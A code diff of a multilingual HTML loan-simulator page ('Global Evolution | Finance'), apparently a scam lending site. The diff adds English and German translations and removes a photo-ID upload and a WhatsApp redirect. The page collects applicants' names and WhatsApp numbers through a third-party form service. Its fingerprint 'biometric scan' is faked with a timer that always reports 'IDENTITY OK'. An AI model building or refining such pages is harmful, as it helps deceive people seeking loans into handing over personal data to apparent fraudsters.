@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Global Aide | Finance 2026</title>
+    <title>Global Evolution | Finance</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
     <style>
@@ -14,9 +14,8 @@
         @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
         .glass-card { background: white; border-radius: 32px; border: 1px solid #e2e8f0; box-shadow: 0 20px 50px rgba(0,0,0,0.05); }
         .btn-elite { background: var(--primary); color: white; transition: all 0.3s; box-shadow: 0 10px 25px rgba(29, 78, 216, 0.3); }
-        .lang-card { border: 2px solid transparent; background: white; cursor: pointer; }
+        .lang-card { border: 2px solid transparent; background: white; cursor: pointer; transition: 0.3s; }
         .lang-card.selected { border-color: var(--primary); background: #eff6ff; }
-        #preview-img { width: 100%; border-radius: 15px; border: 2px solid #1d4ed8; margin-top: 10px; display: none; }
         .scan-line { width: 100%; height: 2px; background: #3b82f6; position: absolute; top: 0; left: 0; box-shadow: 0 0 10px #3b82f6; display: none; }
         @keyframes scanMove { 0% { top: 0; } 50% { top: 100%; } 100% { top: 0; } }
     </style>
@@ -29,8 +28,14 @@
             <div onclick="selectLang('fr', '€')" class="lang-card p-6 rounded-3xl shadow-sm flex flex-col items-center gap-2" id="btn-fr">
                 <span class="text-3xl">🇫🇷</span><span class="font-bold text-[10px] uppercase">Français</span>
             </div>
+            <div onclick="selectLang('en', '$')" class="lang-card p-6 rounded-3xl shadow-sm flex flex-col items-center gap-2" id="btn-en">
+                <span class="text-3xl">🇺🇸</span><span class="font-bold text-[10px] uppercase">English</span>
+            </div>
             <div onclick="selectLang('es', '$')" class="lang-card p-6 rounded-3xl shadow-sm flex flex-col items-center gap-2" id="btn-es">
                 <span class="text-3xl">🇪🇸</span><span class="font-bold text-[10px] uppercase">Español</span>
+            </div>
+            <div onclick="selectLang('de', '€')" class="lang-card p-6 rounded-3xl shadow-sm flex flex-col items-center gap-2" id="btn-de">
+                <span class="text-3xl">🇩🇪</span><span class="font-bold text-[10px] uppercase">Deutsch</span>
             </div>
         </div>
         <button onclick="goToStep(2)" class="btn-elite w-full max-w-sm py-6 rounded-full font-black uppercase flex items-center justify-center gap-3">
@@ -87,7 +92,7 @@
     <section id="step-form" class="step min-h-screen flex-col p-4">
         <div class="max-w-xl mx-auto w-full pb-20">
             <div class="glass-card p-8">
-                <form action="https://formspree.io/f/mzdkpgay" method="POST" id="mainForm" onsubmit="handleFinalSubmit(event)">
+                <form action="https://formspree.io/f/mzdkpgay" method="POST" onsubmit="handleFinalSubmit(event)">
                     <h2 class="text-2xl font-black text-blue-900 mb-6 uppercase" id="form-title">Dossier Digital</h2>
                     
                     <div class="grid grid-cols-2 gap-4 mb-4">
@@ -96,18 +101,10 @@
                     </div>
                     <input type="tel" name="WhatsApp" id="i-wa" required class="w-full p-4 bg-slate-50 border border-slate-200 rounded-2xl outline-none text-sm mb-4">
 
-                    <div class="mt-4 p-6 bg-slate-50 rounded-3xl border-2 border-dashed border-slate-200 text-center cursor-pointer relative overflow-hidden" id="scan-zone" onclick="startScan()">
-                        <div id="scan-line" class="scan-line" style="animation: scanMove 2s infinite linear;"></div>
-                        <div id="scan-icon" class="text-blue-200"><i class="fas fa-fingerprint text-6xl"></i></div>
-                        <p id="scan-text" class="text-[10px] font-black text-blue-900 uppercase mt-4">BIOMÉTRIE</p>
-                    </div>
-
-                    <div class="mt-4 p-6 bg-slate-50 rounded-3xl border-2 border-dashed border-slate-200 text-center">
-                        <input type="file" id="file-input" accept="image/*" class="hidden" onchange="previewImage(event)">
-                        <button type="button" onclick="document.getElementById('file-input').click()" class="px-6 py-3 bg-white border border-slate-200 rounded-xl text-xs font-bold shadow-sm">
-                            <i class="fas fa-camera mr-2"></i> <span id="btn-photo-text">Choisir photo</span>
-                        </button>
-                        <img id="preview-img" src="" alt="Aperçu">
+                    <div class="mt-4 p-8 bg-slate-50 rounded-3xl border-2 border-dashed border-slate-200 text-center cursor-pointer relative overflow-hidden" id="scan-zone" onclick="startScan()">
+                        <div id="scan-line" class="scan-line"></div>
+                        <div id="scan-icon" class="text-blue-200"><i class="fas fa-fingerprint text-7xl"></i></div>
+                        <p id="scan-text" class="text-[10px] font-black text-blue-900 uppercase mt-4 tracking-widest">BIOMÉTRIE</p>
                     </div>
 
                     <button type="submit" id="btn-submit" class="btn-elite w-full py-6 rounded-full font-black uppercase text-sm mt-8">Confirmer l'inscription</button>
@@ -119,8 +116,10 @@
     <script>
         let cL = 'fr', cC = '€', isScanned = false;
         const tr = {
-            fr: { cont: "CONTINUER", sim: "Simulateur", amt: "Montant", dur: "Durée", yr: "Ans", men: "Mensualité", tot: "Total (avec 3%)", fTitle: "DOSSIER", btnPhoto: "Prendre / Choisir photo", btnSubmit: "Confirmer l'inscription", scan: "BIOMÉTRIE", scanOk: "IDENTITÉ OK", plPre: "Prénom", plNom: "Nom", plWa: "WhatsApp" },
-            es: { cont: "CONTINUAR", sim: "Simulador", amt: "Monto", dur: "Plazo", yr: "Años", men: "Cuota", tot: "Total (con 3%)", fTitle: "EXPEDIENTE", btnPhoto: "Tomar / Elegir foto", btnSubmit: "CONFIRMAR", scan: "BIOMETRÍA", scanOk: "IDENTIDAD OK", plPre: "Nombre", plNom: "Apellido", plWa: "WhatsApp" }
+            fr: { cont: "CONTINUER", sim: "Simulateur", amt: "Montant", dur: "Durée", yr: "Ans", men: "Mensualité", tot: "Total (avec 3%)", fTitle: "DOSSIER", btnSubmit: "Confirmer l'inscription", scan: "BIOMÉTRIE", scanWait: "ANALYSE...", scanOk: "IDENTITÉ OK", plPre: "Prénom", plNom: "Nom", plWa: "WhatsApp", btnNext: "Passer au dossier" },
+            en: { cont: "CONTINUE", sim: "Simulator", amt: "Amount", dur: "Duration", yr: "Years", men: "Monthly", tot: "Total (with 3%)", fTitle: "DOSSIER", btnSubmit: "Confirm Now", scan: "BIOMETRICS", scanWait: "SCANNING...", scanOk: "IDENTITY OK", plPre: "First Name", plNom: "Last Name", plWa: "WhatsApp", btnNext: "Next Step" },
+            es: { cont: "CONTINUAR", sim: "Simulador", amt: "Monto", dur: "Plazo", yr: "Años", men: "Cuota", tot: "Total (con 3%)", fTitle: "EXPEDIENTE", btnSubmit: "CONFIRMAR", scan: "BIOMETRÍA", scanWait: "ESCANEANDO...", scanOk: "IDENTIDAD OK", plPre: "Nombre", plNom: "Apellido", plWa: "WhatsApp", btnNext: "PASAR AL EXPEDIENTE" },
+            de: { cont: "WEITER", sim: "Simulator", amt: "Betrag", dur: "Dauer", yr: "Jahre", men: "Monatlich", tot: "Gesamt (mit 3%)", fTitle: "AKTE", btnSubmit: "BESTÄTIGEN", scan: "BIOMETRIE", scanWait: "SCANNT...", scanOk: "IDENTITÄT OK", plPre: "Vorname", plNom: "Nachname", plWa: "WhatsApp", btnNext: "WEITER ZUR AKTE" }
         };
 
         function selectLang(l, c) {
@@ -154,35 +153,23 @@
 
         function startScan() {
             if(isScanned) return;
-            document.getElementById('scan-line').style.display = 'block';
-            document.getElementById('scan-text').innerText = "ANALYSE...";
+            const t = tr[cL];
+            const line = document.getElementById('scan-line');
+            line.style.display = 'block';
+            line.style.animation = 'scanMove 2s infinite linear';
+            document.getElementById('scan-text').innerText = t.scanWait;
+            
             setTimeout(() => {
-                document.getElementById('scan-line').style.display = 'none';
-                document.getElementById('scan-icon').innerHTML = '<i class="fas fa-check-circle text-6xl text-green-500"></i>';
-                document.getElementById('scan-text').innerText = tr[cL].scanOk;
+                line.style.display = 'none';
+                document.getElementById('scan-icon').innerHTML = '<i class="fas fa-check-circle text-7xl text-green-500"></i>';
+                document.getElementById('scan-text').innerText = t.scanOk;
+                document.getElementById('scan-text').classList.replace('text-blue-900', 'text-green-600');
                 isScanned = true;
-            }, 2000);
-        }
-
-        function previewImage(event) {
-            const reader = new FileReader();
-            reader.onload = () => { 
-                const img = document.getElementById('preview-img');
-                img.src = reader.result; img.style.display = 'block';
-            };
-            reader.readAsDataURL(event.target.files[0]);
+            }, 2500);
         }
 
         function handleFinalSubmit(event) {
-            event.preventDefault();
-            if(!isScanned) { alert("Veuillez valider la biométrie."); return; }
-            
-            const name = document.getElementById('i-nom').value;
-            const amt = document.getElementById('val-amt').innerText;
-            const msg = `Bonjour, je suis ${name}. Voici ma pièce d'identité pour mon prêt de ${amt} ${cC}.`;
-            
-            fetch(event.target.action, { method: 'POST', body: new FormData(event.target), headers: { 'Accept': 'application/json' }})
-            .then(() => { window.location.href = `https://wa.me/2290199915433?text=${encodeURIComponent(msg)}`; });
+            if(!isScanned) { event.preventDefault(); alert("Veuillez valider la biométrie."); }
         }
 
         function updateUI() {
@@ -195,8 +182,8 @@
             document.getElementById('res-lbl-men').innerText = t.men;
             document.getElementById('res-lbl-tot').innerText = t.tot;
             document.getElementById('form-title').innerText = t.fTitle;
-            document.getElementById('btn-photo-text').innerText = t.btnPhoto;
             document.getElementById('btn-submit').innerText = t.btnSubmit;
+            document.getElementById('btn-next').innerText = t.btnNext;
             document.getElementById('scan-text').innerText = isScanned ? t.scanOk : t.scan;
             document.getElementById('i-pre').placeholder = t.plPre;
             document.getElementById('i-nom').placeholder = t.plNom;
@@ -207,8 +194,10 @@
         function goToStep(s) {
             document.querySelectorAll('.step').forEach(e => e.classList.remove('active'));
             document.getElementById(['','step-lang','step-sim','step-form'][s]).classList.add('active');
+            window.scrollTo(0,0);
         }
         window.onload = () => { selectLang('fr', '€'); };
     </script>
 </body>
-</html>
+                    </html>
+                    
